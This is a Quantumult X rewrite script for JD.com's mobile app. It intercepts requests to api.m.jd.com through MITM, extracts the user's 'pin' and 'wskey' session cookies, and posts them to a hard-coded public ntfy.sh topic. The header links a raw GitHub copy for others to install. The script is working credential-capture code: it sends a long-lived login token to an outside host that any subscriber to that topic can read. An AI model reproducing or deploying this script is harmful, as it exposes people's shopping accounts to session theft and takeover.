/**************************
 * 京东 wskey 抓取 (Quantumult X) - fetch 版
 *
 * 重写规则 (在 [rewrite_local] 添加):
 * ^https?:\/\/api\.m\.jd\.com url script-request-header https://raw.githubusercontent.com/xiaotaiye88/Test/main/qx_jd_wskey.js
 *
 * MITM 主机名: api.m.jd.com
 **************************/

const NTFY_URL = "https://ntfy.sh/HzjHy2codes";

function httpPost(url, headers, body) {
  // 优先 fetch，回退 $httpClient
  if (typeof fetch !== "undefined") {
    return fetch(url, { method: "POST", headers: headers, body: body });
  } else if (typeof $httpClient !== "undefined") {
    return new Promise((resolve, reject) => {
      $httpClient.post({ url: url, headers: headers, body: body },
        (err, resp, data) => err ? reject(err) : resolve(resp));
    });
  }
  return Promise.reject("no http api available");
}

try {
  const cookie = $request.headers["Cookie"] || $request.headers["cookie"] || "";
  const pinM = cookie.match(/pin=([^;]+)/);
  const wskeyM = cookie.match(/wskey=([^;]+)/);

  if (wskeyM && wskeyM[1]) {
    const wskey = wskeyM[1];
    const pin = pinM ? pinM[1] : "unknown";
    const payload = "JDWSKEY pin=" + pin + ";wskey=" + wskey + ";";

    httpPost(NTFY_URL, {
      "Content-Type": "text/plain",
      "Title": "JD_wskey_" + pin,
    }, payload).then(function () {
      $notify("✅ JD wskey 已抓取", "pin=" + pin,
        "wskey=" + wskey.substring(0, 30) + "... 已推送ntfy");
    }).catch(function (e) {
      $notify("JD推送失败", "pin=" + pin, String(e));
    });
  }
} catch (e) {
  $notify("JD抓取异常", "", String(e));
}

$done({});
